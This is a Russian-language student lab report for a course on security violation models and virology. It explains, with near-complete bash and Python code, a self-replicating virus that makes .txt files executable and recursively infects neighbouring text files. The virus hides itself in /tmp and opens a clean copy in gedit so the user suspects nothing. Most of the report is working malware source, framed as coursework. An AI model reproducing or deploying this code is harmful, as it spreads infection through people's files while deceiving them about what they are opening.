# Лабораторная работа №3

По дисциплине Модели Нарушения Безопасности и Вирусология.

Выполнили:
- Бахир А.Д. группа 7361
- Богович А.Н. группа 7361

Преподаватель:
Савельев М.Ф.

## Задание

1. Для файлов формата txt написать программу, которая преобразовывает текстовые файлы в исполняемые, при этом внешнее отображение должно соответствовать текстовым.
2. Преобразованные файлы, при их запуске, должны открывать текст файла в блокноте при этом находить все файлы формата txt в текущей папке и проводить с ними действия см п1.


## Описание работы

Для того чтобы сделать файлы исполняемыми воспользуемся системой прав Unix. Каждый файл операционной системы имеет свой набор прав для каждой из трёх групп: владелец, группа и "остальные". Для каждой из групп устанавливается набор из трёх бит, указывающих на возможность чтения, записи и исполнения файла в формате `rwx`. 

Если установить файлу права на исполнение, файловые менеджеры могут начать воспринимать его как скрипт и пытаться вместо открытия текстового файла запустить его на исполнение. В частности так делает nautilus, стандартный файловый менеджер в операционной системе ubuntu.

Для корректного запуска интерпретатора в первой строке файла поместим shebang с указанием командной оболочки bash:

```shell
#!/usr/bin/env -S bash 
```

Далее, заполним локальные переменные для дальнейшего использования:

```shell
script_file=$(readlink -f $0)
text_file_dir=$(dirname ${script_file})
script_filename=$(basename ${script_file})
tmp_filename="${script_filename}"
text_file="${text_file_dir}/${tmp_filename}"
```

На время работы файл с вирусом скрывается в виде файла в директории `/tmp` со случайно сгенерированным именем.

```shell
mv -f ${script_file} /tmp/${script_filename}
```

Затем вирус вместо себя создаёт чистый (без вируса) текстовый файл, который можно редактировать. В то же время сохраняет данные, которые были с этом файле перед началом редактирования.

```shell
cat > ${text_file} << EOM
(данные текстового файла)
EOM

old_data=$(cat ${text_file})
```

После этого вирус рекурсивно проверяет собственную директорию на предмет текстовых файлов и заражает их. Уже заражённые файлы пропускаются.

```shell
for filename in $(find . -name '*.txt' | grep -v ${script_filename}) 
do
	if [[ $(cat ${filename} | head -n 1 | head -c 14 | tail -c 3) == "env" ]] 
	then
		continue
	fi
	_data=$(cat ${filename})
	infect_file /tmp/${script_filename} ${filename} "${old_data}" "${_data}"
done
```

Процесс заражения файла выделен в отдельную функцию:

```shell
function infect_file()
{
	source_file=$1
	file=$2
	_old_data=$3
	_new_data=$4
	tmp_infected="/tmp/$(uuidgen)"

	cat ${source_file} > ${tmp_infected}

	python3 -c "_old_data='''${_old_data}''';_new_data='''${_new_data}''';exit(0) if len(_old_data) == 0 else 0;data=open('${tmp_infected}', 'r').read();data=data.replace(_old_data,_new_data);open('${tmp_infected}','w').write(data);"

	cat ${tmp_infected} > ${file}

	chmod +x ${file}
}
```

Сначала сохраняются аргументы функции:
- путь к файлу в котором на данный момент хранится вирус
- путь к заражаемому файлу
- данные перед началом редактирования
- данные после редактирования

Создаётся промежуточная версия вируса в директории `/tmp`, внутри неё заменяется информация текстового файла, а затем содержимое промежуточного файла (уже с вирусом) записывается в тот файл, который нужно заразить. И наконец, заражённому файлу устанавливаются права на исполнение. Теперь заражённый файл является вирусом.

Отдельно процесс замены содержимого файла:

```python
_old_data='''${_old_data}'''
_new_data='''${_new_data}'''
exit(0) if len(_old_data) == 0 else 0
data=open('${tmp_infected}', 'r').read()
data=data.replace(_old_data,_new_data)
open('${tmp_infected}','w').write(data)
```

Возвращаемся к процессу, относящемуся к ходу выполнения вируса. Соседние файлы заражены, вирус спрятан в `/tmp`, а на место вируса подброшен чистый текстовый файл. Откроем файл в текстовом редакторе, чтобы пользователь получил ожидаемое поведение и мог его редактировать. Благодаря тому что вирус подменяет себя временным текстовыми файлом, для пользователя всё будет выглядеть как обычно.

```shell
gedit ${text_file}
```

После того как пользователь закончит работу с файлом, управление вернётся к скрипту. Теперь остаётся только сохранить новую версию файла, и вызвать функцию заражения с необходимыми параметрами.

```shell
new_data=$(cat ${text_file})

infect_file /tmp/${script_filename} ${text_file} "${old_data}" "${new_data}"
```

Теперь тот файл который редактировал пользователь тоже заражён.
